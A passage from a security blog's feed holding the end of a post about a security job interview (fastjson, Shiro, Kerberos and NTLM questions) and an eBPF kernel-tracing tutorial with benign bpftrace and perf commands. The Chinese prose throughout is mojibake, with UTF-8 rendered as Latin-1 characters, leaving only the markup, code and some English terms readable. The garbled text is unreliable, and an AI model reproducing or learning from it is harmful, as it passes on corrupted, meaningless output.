å§</p><p>å¦‚æœå¼€å¯äº†å°±æ˜¯å…ˆç™½åå•è¿‡æ»¤ï¼Œå†é»‘åå•ã€‚</p><p>å¦‚æœæ²¡å¼€å¯å°±æ˜¯ä¼šå…ˆé»‘åå•ï¼Œå†ç™½åå•ã€‚</p><p>7ã€é‚£å…³äº fastjson çš„ parse å’Œ parseObject å‘¢ï¼Ÿ</p><p>parseObjectï¼šè¿”å› fastjson.JSONObject ç±»</p><p>parse ï¼šè¿”å›æˆ‘ä»¬çš„ç±» User</p><p>ä¸€èˆ¬æ¥è¯´ parseObject çš„åˆ©ç”¨é¢æ›´å¹¿</p><p>8ã€æœ‰å­¦è¿‡å“ªäº›æ¡†æ¶å’Œç»„ä»¶å‘¢ï¼Ÿä¸ºä»€ä¹ˆè¦å­¦ä»–ä»¬</p><p>å°±ç®€å•è¯´äº†è¯´ï¼Œä¸è¿‡æˆ‘çš„å›ç­”å¥½åƒè®©é‚£è¾¹æŒºæ»¡æ„çš„</p><p>9ã€å…³äº Shiro çš„æ¼æ´ï¼Œæœ‰äº†è§£å—ï¼Ÿå±•å¼€è¯´è¯´</p><p>è¯´äº† 550ï¼Œ721 å’Œæƒé™ç»•è¿‡</p><p>10ã€è¯´ä¸€è¯´ 721 çš„ Oracle Padding Attack çš„åŸç†</p><p>å¯„ï¼Œæ²¡èƒŒè¿‡</p><p>11ã€ä½ ç”¨ Python å†™è¿‡ä»€ä¹ˆå·¥å…·å—</p><p>è¯´äº†è¯´è‡ªå·±å†™äº†çˆ¬è™«ï¼Œç„¶åå†™äº†ä¸ªç½‘æ®µæ‰«æçš„å·¥å…·ã€‚</p><p>12ã€è¯´åˆ° nmapï¼Œä¸€èˆ¬ nmap æ‰«æå¾ˆæ…¢çš„æ—¶å€™ä¼šæ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>è¿™é‡Œåº”è¯¥æ˜¯ç”¨ msscan æ¯”è¾ƒå¥½</p><p>13ã€æœ‰äº†è§£è¿‡å†…ç½‘ä¹ˆï¼Ÿè¯´ä¸€è¯´ Kerberos åè®®çš„æµç¨‹å§ï¼Œåé¢åˆé—®äº† NTLM åè®®çš„æµç¨‹</p><p>å¯„</p><p>14ã€é™¤äº† NTLM Hashï¼Œè¿˜çŸ¥é“å“ªäº› Hash å‘¢</p><p>å¯„</p><p>15ã€src è‡ªå·±æœ‰åœ¨æŒ–å˜›ï¼Œç®€å•è¯´ä¸€è¯´ä¿¡æ¯æ”¶é›†çš„ä¸€äº›æ–¹æ³•å§ã€‚</p><p>å¯„ï¼Œåé—¨ l3m0n å¸ˆå‚…è¯´æœ‰åå¤šç§æ–¹æ³•ã€‚ã€‚ã€‚</p><p>16ã€è¯è¯´ fastjson éœ€è¦ç¢°åˆ°é«˜ç‰ˆæœ¬çš„ jdk8 çš„æ—¶å€™è¦æ€ä¹ˆç»•è¿‡å‘¢</p><p>è¿™ä¸ªå…¶å®å°±æ˜¯ jndi æ‰“é«˜ç‰ˆæœ¬ jdk çš„æ€è·¯</p><p>17ã€Java è®¾è®¡æ¨¡å¼äº†è§£å¤šå°‘å‘¢</p><p>18ã€æ‰“ CTF æ˜¯è·Ÿç€æˆ˜é˜Ÿæ‹¿å¥–è¿˜æ˜¯è‡ªå·±æ ¡é˜Ÿæ‹¿å¥–</p><p>19ã€å†…ç½‘æ¸—é€çš„æµç¨‹éƒ½äº†è§£å—</p><p>20ã€æˆ‘å¤§è‡´äº†è§£ä½ çš„æƒ…å†µäº†ï¼Œå¯ä»¥è¯´ä¸€è¯´ä½ çš„è§„åˆ’é¢„æœŸå—</p><hr><p>æ¥ä¸‹æ¥å°±æ˜¯åé—®ç¯èŠ‚ï¼Œä¸»è¦æ˜¯é—®äº†é—®ä»–ä»¬åˆ°åº•æ˜¯åšä»€ä¹ˆä¸šåŠ¡çš„ã€‚</p><p>é¢æˆ‘çš„æ˜¯ l3m0n å¸ˆå‚…ï¼Œå¾ˆå¼º</p><h2 id="æ€»ç»“ä¸€ä¸‹"><a href="#æ€»ç»“ä¸€ä¸‹" class="headerlink" title="æ€»ç»“ä¸€ä¸‹"></a>æ€»ç»“ä¸€ä¸‹</h2><p>æŠ•çš„å¤ªæ™šäº†ï¼Œé‡‘ä¸‰é“¶å››ï¼Œæˆ‘æ˜¯å››æœˆåº•æŠ•çš„ï¼Œå·®ä¸å¤šäº”æœˆåˆçš„æ ·å­ï¼Œè¿™ä¸ªéå¸¸ä¸åˆ©ã€‚</p><p>è‡ªå·±èƒ½åŠ›ä¸Šè¿˜æ˜¯æœ‰éå¸¸å¤šçš„ä¸è¶³ã€‚</p><h2 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h2><p>æœ€ç»ˆæ˜¯å…¥èŒäº†å®‰æ’ï¼Œä¸è¿‡é‚£åœ°æ–¹å¾…ä¸ªä¸¤ä¸‰ä¸ªæœˆå°±å¯ä»¥èµ°äº†ï¼Œå·®ä¸å¤šå¾—äº†</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;éšæ‰‹è®°å½•ä¸€ä¸‹&lt;/p&gt;</summary>
    
    
    
    
    <category term="é¢ç»" scheme="https://drun1baby.github.io/tags/%E9%9D%A2%E7%BB%8F/"/>
    
  </entry>
  
  <entry>
    <title>eBPF å†…æ ¸è·Ÿè¸ª</title>
    <link href="https://drun1baby.github.io/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/"/>
    <id>https://drun1baby.github.io/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/</id>
    <published>2023-08-06T07:38:53.000Z</published>
    <updated>2023-08-09T08:35:46.003Z</updated>
    
    <content type="html"><![CDATA[<p>eBPF å†…æ ¸è·Ÿè¸ªï¼ŒeBPF å­¦ä¹ ï¼ˆå››ï¼‰</p><span id="more"></span><h1 id="eBPF-å†…æ ¸è·Ÿè¸ª"><a href="#eBPF-å†…æ ¸è·Ÿè¸ª" class="headerlink" title="eBPF å†…æ ¸è·Ÿè¸ª"></a>eBPF å†…æ ¸è·Ÿè¸ª</h1><p>ä»Šå¤©æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ï¼Œæ€æ ·ä½¿ç”¨ eBPF å»è·Ÿè¸ªå†…æ ¸çš„çŠ¶æ€ï¼Œç‰¹åˆ«æ˜¯æœ€ç®€å•çš„ bpftrace çš„ä½¿ç”¨æ–¹æ³•ã€‚åœ¨ä¸‹ä¸€è®²ä¸­ï¼Œæˆ‘è¿˜å°†ä»‹ç»ä¸¤ç§ eBPF ç¨‹åºçš„è¿›é˜¶ç¼–ç¨‹æ–¹æ³•ã€‚</p><p>ä¸Šä¸€è®²ä¸­æåˆ°è¿‡ï¼Œè·Ÿè¸ªç±» eBPF ç¨‹åºä¸»è¦åŒ…å«å†…æ ¸æ’æ¡©ï¼ˆ<code>BPF_PROG_TYPE_KPROBE</code>ï¼‰ã€è·Ÿè¸ªç‚¹ï¼ˆ<code>BPF_PROG_TYPE_TRACEPOINT</code>ï¼‰ä»¥åŠæ€§èƒ½äº‹ä»¶ï¼ˆ<code>BPF_PROG_TYPE_PERF_EVENT</code>ï¼‰ç­‰ç¨‹åºç±»å‹ï¼Œè€Œæ¯ç±» eBPF ç¨‹åºç±»å‹åˆå¯ä»¥æŒ‚è½½åˆ°ä¸åŒçš„å†…æ ¸å‡½æ•°ã€å†…æ ¸è·Ÿè¸ªç‚¹æˆ–æ€§èƒ½äº‹ä»¶ä¸Šã€‚å½“è¿™äº›å†…æ ¸å‡½æ•°ã€å†…æ ¸è·Ÿè¸ªç‚¹æˆ–æ€§èƒ½äº‹ä»¶è¢«è°ƒç”¨çš„æ—¶å€™ï¼ŒæŒ‚è½½åˆ°å…¶ä¸Šçš„ eBPF ç¨‹åºå°±ä¼šè‡ªåŠ¨æ‰§è¡Œã€‚</p><p>é‚£ä¹ˆï¼Œä½ å¯èƒ½æƒ³é—®äº†ï¼šå½“æˆ‘ä¸çŸ¥é“å†…æ ¸ä¸­éƒ½æœ‰å“ªäº›å†…æ ¸å‡½æ•°ã€å†…æ ¸è·Ÿè¸ªç‚¹æˆ–æ€§èƒ½äº‹ä»¶çš„æ—¶å€™ï¼Œå¯ä»¥åœ¨å“ªé‡ŒæŸ¥è¯¢åˆ°å®ƒä»¬çš„åˆ—è¡¨å‘¢ï¼Ÿå¯¹äºå†…æ ¸å‡½æ•°å’Œå†…æ ¸è·Ÿè¸ªç‚¹ï¼Œåœ¨éœ€è¦è·Ÿè¸ªå®ƒä»¬çš„ä¼ å…¥å‚æ•°å’Œè¿”å›å€¼çš„æ—¶å€™ï¼Œåˆè¯¥å¦‚ä½•æŸ¥è¯¢è¿™äº›æ•°æ®ç»“æ„çš„å®šä¹‰æ ¼å¼å‘¢ï¼Ÿåˆ«æ‹…å¿ƒï¼Œæ¥ä¸‹æ¥å°±è·Ÿæˆ‘ä¸€èµ·å»æ¢ç´¢ä¸‹å§ã€‚</p><h2 id="bpftrace-æŸ¥è¯¢è·Ÿè¸ªç‚¹çš„å‡ ç§æ–¹æ³•"><a href="#bpftrace-æŸ¥è¯¢è·Ÿè¸ªç‚¹çš„å‡ ç§æ–¹æ³•" class="headerlink" title="bpftrace æŸ¥è¯¢è·Ÿè¸ªç‚¹çš„å‡ ç§æ–¹æ³•"></a>bpftrace æŸ¥è¯¢è·Ÿè¸ªç‚¹çš„å‡ ç§æ–¹æ³•</h2><blockquote><p>å®˜æ–¹æ–‡æ¡£ <a class="link" href="https://github.com/iovisor/bpftrace/blob/master/docs/reference_guide.md">https://github.com/iovisor/bpftrace/blob/master/docs/reference_guide.md<i class="fas fa-external-link-alt"></i></a></p></blockquote><h3 id="åˆ©ç”¨è°ƒè¯•ä¿¡æ¯æŸ¥è¯¢è·Ÿè¸ªç‚¹"><a href="#åˆ©ç”¨è°ƒè¯•ä¿¡æ¯æŸ¥è¯¢è·Ÿè¸ªç‚¹" class="headerlink" title="åˆ©ç”¨è°ƒè¯•ä¿¡æ¯æŸ¥è¯¢è·Ÿè¸ªç‚¹"></a>åˆ©ç”¨è°ƒè¯•ä¿¡æ¯æŸ¥è¯¢è·Ÿè¸ªç‚¹</h3><p>å®é™…ä¸Šï¼Œä½œä¸ºä¸€ä¸ªè½¯ä»¶ç³»ç»Ÿï¼Œå†…æ ¸ä¹Ÿç»å¸¸ä¼šå‘ç”Ÿå„ç§å„æ ·çš„é—®é¢˜ï¼Œæ¯”å¦‚å®‰å…¨æ¼æ´ã€é€»è¾‘é”™è¯¯ã€æ€§èƒ½å·®ï¼Œç­‰ç­‰ã€‚å› æ­¤ï¼Œå†…æ ¸æœ¬èº«çš„è°ƒè¯•ä¸è·Ÿè¸ªä¸€ç›´éƒ½æ˜¯å†…æ ¸æä¾›çš„æ ¸å¿ƒåŠŸèƒ½ä¹‹ä¸€ã€‚</p><p>æ¯”å¦‚ï¼Œä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œå†…æ ¸æŠŠæ‰€æœ‰å‡½æ•°ä»¥åŠéæ ˆå˜é‡çš„åœ°å€éƒ½æŠ½å–åˆ°äº† Â <code>/proc/kallsyms</code>Â  ä¸­ï¼Œè¿™æ ·è°ƒè¯•å™¨å°±å¯ä»¥æ ¹æ®åœ°å€æ‰¾å‡ºå¯¹åº”çš„å‡½æ•°å’Œå˜é‡åç§°ã€‚å¾ˆæ˜¾ç„¶ï¼Œå…·æœ‰å®é™…å«ä¹‰çš„åç§°è¦æ¯” 16 è¿›åˆ¶çš„åœ°å€æ˜“è¯»å¾—å¤šã€‚å¯¹å†…æ ¸æ’æ¡©ç±»çš„ eBPF ç¨‹åºæ¥è¯´ï¼Œå®ƒä»¬è¦æŒ‚è½½çš„å†…æ ¸å‡½æ•°å°±å¯ä»¥ä» Â <code>/proc/kallsyms</code>Â  è¿™ä¸ªæ–‡ä»¶ä¸­æŸ¥åˆ°ã€‚</p><p>æ³¨æ„ï¼Œå†…æ ¸å‡½æ•°æ˜¯ä¸€ä¸ªéç¨³å®š APIï¼Œåœ¨æ–°ç‰ˆæœ¬ä¸­å¯èƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œå¹¶ä¸”å†…æ ¸å‡½æ•°çš„æ•°é‡ä¹Ÿåœ¨ä¸æ–­å¢é•¿ä¸­ã€‚ä»¥ v5.13.0 ä¸ºä¾‹ï¼Œæ€»çš„å†…æ ¸ç¬¦å·è¡¨æ•°é‡å·²ç»è¶…è¿‡äº† 16 ä¸‡ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /proc/kallsyms | <span class="built_in">wc</span> -l</span><br><span class="line">165694</span><br></pre></td></tr></table></figure><p>ä¸è¿‡éœ€è¦æé†’ä½ çš„æ˜¯ï¼Œè¿™äº›ç¬¦å·è¡¨ä¸ä»…åŒ…å«äº†å†…æ ¸å‡½æ•°ï¼Œè¿˜åŒ…å«äº†éæ ˆæ•°æ®å˜é‡ã€‚è€Œä¸”ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„å†…æ ¸å‡½æ•°éƒ½æ˜¯å¯è·Ÿè¸ªçš„ï¼Œåªæœ‰æ˜¾å¼å¯¼å‡ºçš„å†…æ ¸å‡½æ•°æ‰å¯ä»¥è¢« eBPF è¿›è¡ŒåŠ¨æ€è·Ÿè¸ªã€‚å› è€Œï¼Œé€šå¸¸æˆ‘ä»¬å¹¶ä¸ç›´æ¥ä»å†…æ ¸ç¬¦å·è¡¨æŸ¥è¯¢å¯è·Ÿè¸ªç‚¹ï¼Œè€Œæ˜¯ä½¿ç”¨æˆ‘æ¥ä¸‹æ¥ä»‹ç»çš„æ–¹æ³•ã€‚</p><p>ä¸ºäº†æ–¹ä¾¿å†…æ ¸å¼€å‘è€…è·å–æ‰€éœ€çš„è·Ÿè¸ªç‚¹ä¿¡æ¯ï¼Œå†…æ ¸<a class="link" href="https://www.kernel.org/doc/html/latest/filesystems/debugfs.html">è°ƒè¯•æ–‡ä»¶ç³»ç»Ÿ<i class="fas fa-external-link-alt"></i></a>è¿˜å‘ç”¨æˆ·ç©ºé—´æä¾›äº†å†…æ ¸è°ƒè¯•æ‰€éœ€çš„åŸºæœ¬ä¿¡æ¯ï¼Œå¦‚å†…æ ¸ç¬¦å·åˆ—è¡¨ã€è·Ÿè¸ªç‚¹ã€å‡½æ•°è·Ÿè¸ªï¼ˆftraceï¼‰çŠ¶æ€ä»¥åŠå‚æ•°æ ¼å¼ç­‰ã€‚ä½ å¯ä»¥åœ¨ç»ˆç«¯ä¸­æ‰§è¡Œ Â <code>sudo ls /sys/kernel/debug</code>Â  æ¥æŸ¥è¯¢å†…æ ¸è°ƒè¯•æ–‡ä»¶ç³»ç»Ÿçš„å…·ä½“ä¿¡æ¯ã€‚æ¯”å¦‚ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œå°±å¯ä»¥æŸ¥è¯¢ Â <code>execve</code>Â  ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°æ ¼å¼ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /sys/kernel/debug/tracing/events/syscalls/sys_enter_execve/format</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼ŒeBPF ç¨‹åºçš„æ‰§è¡Œä¹Ÿä¾èµ–äºè°ƒè¯•æ–‡ä»¶ç³»ç»Ÿã€‚å¦‚æœä½ çš„ç³»ç»Ÿæ²¡æœ‰è‡ªåŠ¨æŒ‚è½½å®ƒï¼Œé‚£ä¹ˆæˆ‘æ¨èä½ æŠŠå®ƒåŠ å…¥åˆ°ç³»ç»Ÿå¼€æœºå¯åŠ¨è„šæœ¬é‡Œé¢ï¼Œè¿™æ ·æœºå™¨é‡å¯å eBPF ç¨‹åºä¹Ÿå¯ä»¥æ­£å¸¸è¿è¡Œã€‚</p><p>æœ‰äº†è°ƒè¯•æ–‡ä»¶ç³»ç»Ÿï¼Œä½ å°±å¯ä»¥ä» Â <code>/sys/kernel/debug/tracing</code>Â  ä¸­æ‰¾åˆ°æ‰€æœ‰å†…æ ¸é¢„å®šä¹‰çš„è·Ÿè¸ªç‚¹ï¼Œè¿›è€Œå¯ä»¥åœ¨éœ€è¦æ—¶æŠŠ eBPF ç¨‹åºæŒ‚è½½åˆ°å¯¹åº”çš„è·Ÿè¸ªç‚¹ã€‚</p><p>é™¤äº†å†…æ ¸å‡½æ•°å’Œè·Ÿè¸ªç‚¹ä¹‹å¤–ï¼Œæ€§èƒ½äº‹ä»¶åˆè¯¥å¦‚ä½•æŸ¥è¯¢å‘¢ï¼Ÿä½ å¯ä»¥ä½¿ç”¨ Linux æ€§èƒ½å·¥å…· Â perfÂ  æ¥æŸ¥è¯¢æ€§èƒ½äº‹ä»¶çš„åˆ—è¡¨ã€‚å¦‚ä¸‹é¢çš„å‘½ä»¤æ‰€ç¤ºï¼Œä½ å¯ä»¥ä¸å¸¦å‚æ•°æŸ¥è¯¢æ‰€æœ‰çš„æ€§èƒ½äº‹ä»¶ï¼Œä¹Ÿå¯ä»¥åŠ å…¥å¯é€‰çš„äº‹ä»¶ç±»å‹å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo perf list [hw|sw|cache|tracepoint|pmu|sdt|metric|metricgroup]</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨-bpftrace-æŸ¥è¯¢è·Ÿè¸ªç‚¹"><a href="#åˆ©ç”¨-bpftrace-æŸ¥è¯¢è·Ÿè¸ªç‚¹" class="headerlink" title="åˆ©ç”¨ bpftrace æŸ¥è¯¢è·Ÿè¸ªç‚¹"></a>åˆ©ç”¨ bpftrace æŸ¥è¯¢è·Ÿè¸ªç‚¹</h3><p>è™½ç„¶ä½ å¯ä»¥åˆ©ç”¨å†…æ ¸è°ƒè¯•ä¿¡æ¯å’Œ perf å·¥å…·æŸ¥è¯¢å†…æ ¸å‡½æ•°ã€è·Ÿè¸ªç‚¹ä»¥åŠæ€§èƒ½äº‹ä»¶çš„åˆ—è¡¨ï¼Œä½†å®ƒä»¬çš„ä½ç½®æ¯”è¾ƒåˆ†æ•£ï¼Œå¹¶ä¸”ç”¨è¿™ç§æ–¹æ³•ä¹Ÿä¸å®¹æ˜“æŸ¥è¯¢å†…æ ¸å‡½æ•°çš„å®šä¹‰æ ¼å¼ã€‚æ‰€ä»¥ï¼Œæˆ‘å†ç»™ä½ æ¨èä¸€ä¸ªæ›´å¥½ç”¨çš„ eBPF å·¥å…· Â <a class="link" href="https://github.com/iovisor/bpftrace/blob/master/docs/reference_guide.md">bpftrace<i class="fas fa-external-link-alt"></i></a>ã€‚</p><p>bpftrace åœ¨ eBPF å’Œ BCC ä¹‹ä¸Šæ„å»ºäº†ä¸€ä¸ªç®€åŒ–çš„è·Ÿè¸ªè¯­è¨€ï¼Œé€šè¿‡ç®€å•çš„å‡ è¡Œè„šæœ¬ï¼Œå°±å¯ä»¥å®ç°å¤æ‚çš„è·Ÿè¸ªåŠŸèƒ½ã€‚å¹¶ä¸”ï¼Œå¤šè¡Œçš„è·Ÿè¸ªæŒ‡ä»¤ä¹Ÿå¯ä»¥æ”¾åˆ°è„šæœ¬æ–‡ä»¶ä¸­æ‰§è¡Œï¼ˆè„šæœ¬åç¼€é€šå¸¸ä¸º Â <code>.bt</code>ï¼‰ã€‚</p><p>å¦‚ä¸‹å›¾ï¼ˆå›¾ç‰‡æ¥è‡ª bpftraceæ–‡æ¡£ï¼‰æ‰€ç¤ºï¼Œbpftrace ä¼šæŠŠä½ å¼€å‘çš„è„šæœ¬å€ŸåŠ© BCC ç¼–è¯‘åŠ è½½åˆ°å†…æ ¸ä¸­æ‰§è¡Œï¼Œå†é€šè¿‡ BPF æ˜ å°„è·å–æ‰§è¡Œçš„ç»“æœï¼š</p><img src="/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/bpfTraceResult.png" class><p>å› æ­¤ï¼Œåœ¨ç¼–å†™ç®€å•çš„ eBPF ç¨‹åºï¼Œç‰¹åˆ«æ˜¯ç¼–å†™çš„ eBPF ç¨‹åºç”¨äºä¸´æ—¶çš„è°ƒè¯•å’Œæ’é”™æ—¶ï¼Œä½ å¯ä»¥è€ƒè™‘ç›´æ¥ä½¿ç”¨ bpftrace ï¼Œè€Œä¸éœ€è¦ç”¨ C æˆ– Python å»å¼€å‘ä¸€ä¸ªå¤æ‚çš„ç¨‹åºã€‚</p><ul><li>å®‰è£… bpf</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y bpftrace</span><br></pre></td></tr></table></figure><p>å®‰è£…å¥½ bpftrace ä¹‹åï¼Œä½ å°±å¯ä»¥æ‰§è¡Œ Â <code>bpftrace -l</code>Â  æ¥æŸ¥è¯¢å†…æ ¸æ’æ¡©å’Œè·Ÿè¸ªç‚¹äº†ã€‚æ¯”å¦‚ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹å‡ ç§æ–¹å¼æ¥æŸ¥è¯¢ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥è¯¢æ‰€æœ‰å†…æ ¸æ’æ¡©å’Œè·Ÿè¸ªç‚¹</span></span><br><span class="line">sudo bpftrace -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨é€šé…ç¬¦æŸ¥è¯¢æ‰€æœ‰çš„ç³»ç»Ÿè°ƒç”¨è·Ÿè¸ªç‚¹</span></span><br><span class="line">sudo bpftrace -l <span class="string">&#x27;tracepoint:syscalls:*&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨é€šé…ç¬¦æŸ¥è¯¢æ‰€æœ‰åå­—åŒ…å«&quot;execve&quot;çš„è·Ÿè¸ªç‚¹</span></span><br><span class="line">sudo bpftrace -l <span class="string">&#x27;*execve*&#x27;</span></span><br></pre></td></tr></table></figure><p>å¯¹äºè·Ÿè¸ªç‚¹æ¥è¯´ï¼Œä½ è¿˜å¯ä»¥åŠ ä¸Š Â <code>-v</code>Â  å‚æ•°æŸ¥è¯¢å‡½æ•°çš„å…¥å£å‚æ•°æˆ–è¿”å›å€¼ã€‚è€Œç”±äºå†…æ ¸å‡½æ•°å±äºä¸ç¨³å®šçš„ APIï¼Œåœ¨ bpftrace ä¸­åªèƒ½é€šè¿‡ Â <code>arg0</code>ã€<code>arg1</code>Â  è¿™æ ·çš„å‚æ•°æ¥è®¿é—®ï¼Œå…·ä½“çš„å‚æ•°æ ¼å¼è¿˜éœ€è¦å‚è€ƒå†…æ ¸æºä»£ç ã€‚</p><p>æ¯”å¦‚ï¼Œä¸‹é¢å°±æ˜¯ä¸€ä¸ªæŸ¥è¯¢ç³»ç»Ÿè°ƒç”¨ Â <code>execve</code>Â  å…¥å£å‚æ•°ï¼ˆå¯¹åº”ç³»ç»Ÿè°ƒç”¨ <code>sys_enter_execve</code>ï¼‰å’Œè¿”å›å€¼ï¼ˆå¯¹åº”ç³»ç»Ÿè°ƒç”¨ <code>sys_exit_execve</code>ï¼‰çš„ç¤ºä¾‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥è¯¢execveå…¥å£å‚æ•°æ ¼å¼</span></span><br><span class="line">$ sudo bpftrace -lv tracepoint:syscalls:sys_enter_execve</span><br><span class="line">tracepoint:syscalls:sys_enter_execve</span><br><span class="line">    int __syscall_nr</span><br><span class="line">    const char * filename</span><br><span class="line">    const char *const * argv</span><br><span class="line">    const char *const * envp</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥è¯¢execveè¿”å›å€¼æ ¼å¼</span></span><br><span class="line">$ sudo bpftrace -lv tracepoint:syscalls:sys_exit_execve</span><br><span class="line">tracepoint:syscalls:sys_exit_execve</span><br><span class="line">    int __syscall_nr</span><br><span class="line">    long ret</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œä½ æ—¢å¯ä»¥é€šè¿‡å†…æ ¸è°ƒè¯•ä¿¡æ¯å’Œ perf æ¥æŸ¥è¯¢å†…æ ¸å‡½æ•°ã€è·Ÿè¸ªç‚¹ä»¥åŠæ€§èƒ½äº‹ä»¶çš„åˆ—è¡¨ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ bpftrace å·¥å…·æ¥æŸ¥è¯¢ã€‚</p><p>åœ¨è¿™ä¸¤ç§æ–¹æ³•ä¸­ï¼Œæˆ‘æ›´æ¨èä½¿ç”¨æ›´ç®€å•çš„ bpftrace è¿›è¡ŒæŸ¥è¯¢ã€‚è¿™æ˜¯å› ä¸ºï¼Œæˆ‘ä»¬é€šå¸¸åªéœ€è¦åœ¨å¼€å‘ç¯å¢ƒæŸ¥è¯¢è¿™äº›åˆ—è¡¨ï¼Œä»¥ä¾¿å»å‡†å¤‡ eBPF ç¨‹åºçš„æŒ‚è½½ç‚¹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè™½ç„¶ bpftrace ä¾èµ– BCC å’Œ LLVM å¼€å‘å·¥å…·ï¼Œä½†å¼€å‘ç¯å¢ƒæœ¬æ¥å°±éœ€è¦è¿™äº›åº“å’Œå¼€å‘å·¥å…·ã€‚ç»¼åˆæ¥çœ‹ï¼Œç”¨ bpftrace å·¥å…·æ¥æŸ¥è¯¢çš„æ–¹æ³•æ˜¾ç„¶æ›´ç®€å•å¿«æ·ã€‚</p><p>åœ¨å¼€å‘ eBPF ç¨‹åºä¹‹å‰ï¼Œè¿˜éœ€è¦åœ¨è¿™äº›é•¿é•¿çš„å‡½æ•°åˆ—è¡¨ä¸­è¿›è¡Œé€‰æ‹©ï¼Œç¡®å®šä½ åº”è¯¥æŒ‚è½½åˆ°å“ªä¸€ä¸ªä¸Šã€‚é‚£ä¹ˆï¼Œå…·ä½“è¯¥å¦‚ä½•é€‰æ‹©å‘¢ï¼Ÿæ¥ä¸‹æ¥ï¼Œå°±è¿›å…¥æˆ‘ä»¬çš„æ¡ˆä¾‹ç¯èŠ‚ï¼Œä¸€èµ·çœ‹çœ‹å†…æ ¸è·Ÿè¸ªç‚¹çš„å…·ä½“ä½¿ç”¨æ–¹æ³•ã€‚</p><h3 id="å¦‚ä½•åˆ©ç”¨å†…æ ¸è·Ÿè¸ªç‚¹æ’æŸ¥çŸ­æ—¶è¿›ç¨‹é—®é¢˜ï¼Ÿ"><a href="#å¦‚ä½•åˆ©ç”¨å†…æ ¸è·Ÿè¸ªç‚¹æ’æŸ¥çŸ­æ—¶è¿›ç¨‹é—®é¢˜ï¼Ÿ" class="headerlink" title="å¦‚ä½•åˆ©ç”¨å†…æ ¸è·Ÿè¸ªç‚¹æ’æŸ¥çŸ­æ—¶è¿›ç¨‹é—®é¢˜ï¼Ÿ"></a>å¦‚ä½•åˆ©ç”¨å†…æ ¸è·Ÿè¸ªç‚¹æ’æŸ¥çŸ­æ—¶è¿›ç¨‹é—®é¢˜ï¼Ÿ</h3><p>åœ¨æ’æŸ¥ç³»ç»Ÿ CPU ä½¿ç”¨ç‡é«˜çš„é—®é¢˜æ—¶ï¼Œæˆ‘æƒ³ä½ å¾ˆå¯èƒ½é‡åˆ°è¿‡è¿™æ ·çš„å›°æƒ‘ï¼šæ˜æ˜é€šè¿‡ Â topÂ  å‘½ä»¤å‘ç°ç³»ç»Ÿçš„ CPU ä½¿ç”¨ç‡ï¼ˆç‰¹åˆ«æ˜¯ç”¨æˆ· CPU ä½¿ç”¨ç‡ï¼‰ç‰¹åˆ«é«˜ï¼Œä½†é€šè¿‡ Â psã€pidstatÂ  ç­‰å·¥å…·éƒ½æ‰¾ä¸å‡º CPU ä½¿ç”¨ç‡é«˜çš„è¿›ç¨‹ã€‚è¿™æ˜¯ä»€ä¹ˆåŸå› å¯¼è‡´çš„å‘¢ï¼Ÿä½ å¯ä»¥å…ˆåœä¸‹æ¥æ€è€ƒä¸€ä¸‹ï¼Œå†ç»§ç»­ä¸‹é¢çš„å†…å®¹ã€‚</p><p>ä½ æƒ³åˆ°å¯èƒ½çš„åŸå› äº†å—ï¼Ÿåœ¨æˆ‘çœ‹æ¥ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè¿™ç±»é—®é¢˜å¾ˆå¯èƒ½æ˜¯ä»¥ä¸‹ä¸¤ä¸ªåŸå› å¯¼è‡´çš„ï¼š</p><ul><li>ç¬¬ä¸€ï¼Œåº”ç”¨ç¨‹åºé‡Œé¢ç›´æ¥è°ƒç”¨å…¶ä»–äºŒè¿›åˆ¶ç¨‹åºï¼Œå¹¶ä¸”è¿™äº›ç¨‹åºçš„è¿è¡Œæ—¶é—´å¾ˆçŸ­ï¼Œé€šè¿‡ Â topÂ  